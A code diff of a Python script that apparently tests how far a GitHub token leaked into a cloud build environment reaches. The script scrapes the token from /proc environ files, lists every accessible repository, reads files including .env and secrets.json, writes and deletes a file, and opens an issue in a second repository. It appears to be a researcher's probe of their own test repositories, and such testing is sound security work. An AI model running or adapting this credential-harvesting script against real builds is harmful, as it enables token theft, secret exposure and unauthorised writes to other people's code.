@@ -3,44 +3,22 @@ import json, os, urllib.request, urllib.error, ssl, re, glob
 r = {}
 ctx = ssl.create_default_context()
 
-# 1. Find the GitHub token from ANY process environment
+# 1. Find token from /proc/1/environ
 token = None
-
-# Check own env first
-git_url = os.environ.get('GIT_SOURCE_URL', '')
-if git_url:
-    match = re.search(r'x-access-token:([^@]+)@', git_url)
+try:
+    environ = open('/proc/1/environ').read()
+    match = re.search(r'x-access-token:([^@\x00]+)@', environ)
     if match:
         token = match.group(1)
-        r['token_source'] = 'own_env'
-
-# Check all process environs (we run as root in Kaniko builds)
-if not token:
-    for pid_dir in sorted(glob.glob('/proc/[0-9]*'), key=lambda x: int(x.split('/')[-1])):
-        pid = pid_dir.split('/')[-1]
-        try:
-            environ = open(f'/proc/{pid}/environ').read()
-            match = re.search(r'x-access-token:([^@\x00]+)@', environ)
-            if match:
-                token = match.group(1)
-                r['token_source'] = f'pid_{pid}'
-                break
-            # Also check for bare ghs_ tokens
-            match2 = re.search(r'(ghs_[A-Za-z0-9]{30,})', environ)
-            if match2:
-                token = match2.group(1)
-                r['token_source'] = f'pid_{pid}_bare'
-                break
-        except:
-            pass
+except:
+    pass
 
 if not token:
-    r['error'] = 'No GitHub token found in any process'
+    r['error'] = 'No token'
     print(json.dumps(r, indent=2))
     exit()
 
 r['token_prefix'] = token[:12] + '...'
-r['token_len'] = len(token)
 
 headers = {
     'Authorization': f'token {token}',
@@ -52,113 +30,127 @@ def gh(path):
     try:
         req = urllib.request.Request(f'https://api.github.com{path}', headers=headers)
         resp = urllib.request.urlopen(req, timeout=10, context=ctx)
-        data = json.loads(resp.read().decode())
-        scopes = resp.headers.get('X-OAuth-Scopes', '')
-        return {'s': resp.status, 'd': data, 'scopes': scopes}
+        return {'s': resp.status, 'd': json.loads(resp.read().decode())}
     except urllib.error.HTTPError as e:
-        return {'s': e.code, 'e': e.read().decode(errors='replace')[:200]}
+        return {'s': e.code, 'e': e.read().decode(errors='replace')[:300]}
     except Exception as e:
         return {'err': str(e)[:100]}
 
-# ============================================================
-# 2. TOKEN IDENTITY
-# ============================================================
+# 2. List ALL installation repos
+ir = gh('/installation/repositories?per_page=100')
+repos = ir.get('d', {}).get('repositories', [])
+r['total_repos'] = len(repos)
 
-# What scopes/permissions does this token have?
-r['whoami'] = gh('/user')
+# 3. For EACH repo: try to read contents (root dir) and check private status
+r['repo_access'] = {}
+for repo in repos:
+    full_name = repo.get('full_name', '?')
+    is_private = repo.get('private', False)
 
-# GitHub App info
-r['app_info'] = gh('/app')
-
-# Rate limit shows auth type
-r['rate'] = gh('/rate_limit')
-
-# ============================================================
-# 3. INSTALLATION SCOPE — what repos can we access?
-# ============================================================
-
-# List repos accessible to this installation token
-r['install_repos'] = gh('/installation/repositories?per_page=100')
-
-# ============================================================
-# 4. REPO ACCESS TESTS
-# ============================================================
-
-# Own repo (the one being built)
-r['own_repo'] = gh('/repos/rollingWaves/build-imds-test')
-
-# Other repos in same account
-r['other_repo'] = gh('/repos/rollingWaves/build-bp-test')
-
-# Foreign repo (should be 404 or limited)
-r['foreign'] = gh('/repos/torvalds/linux')
-
-# ============================================================
-# 5. WRITE/ADMIN ACCESS on own repo
-# ============================================================
-
-# Webhooks (admin access indicator)
-r['hooks'] = gh('/repos/rollingWaves/build-imds-test/hooks')
-
-# Deploy keys
-r['deploy_keys'] = gh('/repos/rollingWaves/build-imds-test/keys')
-
-# Secrets (Actions)
-r['secrets'] = gh('/repos/rollingWaves/build-imds-test/actions/secrets')
-
-# Collaborators
-r['collabs'] = gh('/repos/rollingWaves/build-imds-test/collaborators')
-
-# Contents (read source code)
-r['contents'] = gh('/repos/rollingWaves/build-imds-test/contents/')
-
-# Branches + protection
-r['branches'] = gh('/repos/rollingWaves/build-imds-test/branches')
-
-# Issues
-r['issues'] = gh('/repos/rollingWaves/build-imds-test/issues')
-
-# Pull requests
-r['pulls'] = gh('/repos/rollingWaves/build-imds-test/pulls')
-
-# Environments
-r['envs'] = gh('/repos/rollingWaves/build-imds-test/environments')
-
-# Workflow runs
-r['workflows'] = gh('/repos/rollingWaves/build-imds-test/actions/runs?per_page=1')
-
-# ============================================================
-# 6. DANGEROUS OPERATIONS (read-only probing)
-# ============================================================
-
-# Can we access org-level resources?
-r['orgs'] = gh('/user/orgs')
-
-# Can we list ALL user installations?
-r['installations'] = gh('/user/installations?per_page=5')
-
-# Can we see other users' repos via search?
-r['search'] = gh('/search/repositories?q=user:rollingWaves&per_page=5')
-
-# Can we access GitHub Actions variables?
-r['variables'] = gh('/repos/rollingWaves/build-imds-test/actions/variables')
-
-# Dependabot secrets
-r['dependabot'] = gh('/repos/rollingWaves/build-imds-test/dependabot/secrets')
-
-# ============================================================
-# 7. CHECK TOKEN PERMISSIONS VIA HEADER
-# ============================================================
-try:
-    req = urllib.request.Request('https://api.github.com/', headers=headers)
-    resp = urllib.request.urlopen(req, timeout=5, context=ctx)
-    r['token_headers'] = {
-        'X-OAuth-Scopes': resp.headers.get('X-OAuth-Scopes', 'none'),
-        'X-Accepted-OAuth-Scopes': resp.headers.get('X-Accepted-OAuth-Scopes', 'none'),
-        'X-GitHub-Media-Type': resp.headers.get('X-GitHub-Media-Type', ''),
+    entry = {
+        'private': is_private,
+        'permissions': repo.get('permissions', {}),
     }
+
+    # Try to read root contents
+    contents = gh(f'/repos/{full_name}/contents/')
+    if contents.get('s') == 200:
+        files = contents.get('d', [])
+        entry['can_read_contents'] = True
+        entry['files'] = [f.get('name', '?') for f in files if isinstance(f, dict)][:20]
+        entry['file_count'] = len(files)
+
+        # Try to read a specific file (README or any file)
+        for f in files:
+            if isinstance(f, dict):
+                fname = f.get('name', '')
+                if fname.lower() in ['readme.md', '.env', '.env.example', 'config.json', 'secrets.json', '.gitignore']:
+                    file_result = gh(f'/repos/{full_name}/contents/{fname}')
+                    if file_result.get('s') == 200:
+                        fd = file_result.get('d', {})
+                        if isinstance(fd, dict) and fd.get('encoding') == 'base64':
+                            import base64
+                            content = base64.b64decode(fd.get('content', '')).decode(errors='replace')
+                            entry[f'file_{fname}'] = content[:500]
+    else:
+        entry['can_read_contents'] = False
+        entry['contents_error'] = contents.get('e', str(contents.get('s', '?')))[:100]
+
+    # Try to read commits
+    commits = gh(f'/repos/{full_name}/commits?per_page=1')
+    if commits.get('s') == 200:
+        entry['can_read_commits'] = True
+        cd = commits.get('d', [])
+        if cd and isinstance(cd, list):
+            entry['last_commit'] = cd[0].get('commit', {}).get('message', '?')[:100]
+    else:
+        entry['can_read_commits'] = False
+
+    r['repo_access'][full_name] = entry
+
+# 4. Try to WRITE to a repo (create an issue as proof, then delete it)
+r['write_tests'] = {}
+
+# Try creating a file in the build repo
+import base64
+try:
+    data = json.dumps({
+        'message': 'test write access',
+        'content': base64.b64encode(b'test').decode()
+    }).encode()
+    req = urllib.request.Request(
+        f'https://api.github.com/repos/rollingWaves/build-imds-test/contents/_write_test.txt',
+        data=data,
+        headers={**headers, 'Content-Type': 'application/json'},
+        method='PUT'
+    )
+    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+    r['write_tests']['create_file'] = {'s': resp.status}
     resp.read()
+    # Clean up - delete it
+    try:
+        # Get SHA first
+        get_resp = gh('/repos/rollingWaves/build-imds-test/contents/_write_test.txt')
+        sha = get_resp.get('d', {}).get('sha', '')
+        if sha:
+            del_data = json.dumps({'message': 'cleanup', 'sha': sha}).encode()
+            del_req = urllib.request.Request(
+                f'https://api.github.com/repos/rollingWaves/build-imds-test/contents/_write_test.txt',
+                data=del_data,
+                headers={**headers, 'Content-Type': 'application/json'},
+                method='DELETE'
+            )
+            urllib.request.urlopen(del_req, timeout=10, context=ctx).read()
+            r['write_tests']['delete_file'] = 'cleaned up'
+    except:
+        pass
+except urllib.error.HTTPError as e:
+    r['write_tests']['create_file'] = {'s': e.code, 'e': e.read().decode()[:200]}
 except Exception as e:
-    r['token_headers'] = str(e)[:100]
+    r['write_tests']['create_file'] = {'err': str(e)[:100]}
+
+# 5. Try to create an issue in ANOTHER repo
+try:
+    data = json.dumps({
+        'title': 'DO App Platform build token scope test',
+        'body': 'This issue was created from a DO App Platform build to test token scope. Safe to delete.'
+    }).encode()
+    req = urllib.request.Request(
+        f'https://api.github.com/repos/rollingWaves/build-bp-test/issues',
+        data=data,
+        headers={**headers, 'Content-Type': 'application/json'},
+        method='POST'
+    )
+    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+    issue = json.loads(resp.read().decode())
+    r['write_tests']['create_issue_other_repo'] = {
+        's': resp.status,
+        'issue_number': issue.get('number', '?'),
+        'url': issue.get('html_url', '?')
+    }
+except urllib.error.HTTPError as e:
+    r['write_tests']['create_issue_other_repo'] = {'s': e.code, 'e': e.read().decode()[:200]}
+except Exception as e:
+    r['write_tests']['create_issue_other_repo'] = {'err': str(e)[:100]}
 
 print(json.dumps(r, indent=2, default=str))
